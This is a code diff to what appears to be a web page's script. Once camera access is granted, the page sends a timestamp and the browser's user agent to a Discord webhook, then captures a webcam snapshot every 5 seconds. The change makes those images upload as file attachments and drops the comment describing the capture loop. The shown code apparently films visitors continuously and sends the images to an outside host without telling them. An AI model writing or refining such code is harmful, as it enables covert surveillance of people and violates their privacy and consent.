@@ -216,17 +216,15 @@
 
         async function sendToDiscord(message, imageData = null) {
             try {
-                const payload = { content: message };
+                const formData = new FormData();
+                formData.append('content', message);
                 if (imageData) {
-                    payload.attachments = [{
-                        attachment: imageData,
-                        name: `snapshot-${new Date().toISOString()}.png`
-                    }];
+                    const blob = await fetch(imageData).then(res => res.blob());
+                    formData.append('file', blob, `snapshot-${new Date().toISOString()}.png`);
                 }
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: formData
                 });
                 if (!response.ok) throw new Error('Webhook failed');
                 console.log('Sent to Discord');
@@ -261,7 +259,6 @@
                 const timestamp = new Date().toLocaleString();
                 const browserInfo = navigator.userAgent;
                 await sendToDiscord(`Camera access granted at ${timestamp}. Browser: ${browserInfo}`);
-                // Start capturing snapshots every 5 seconds
                 setInterval(captureSnapshot, 5000);
             } catch (err) {
                 console.error('Camera error:', err);
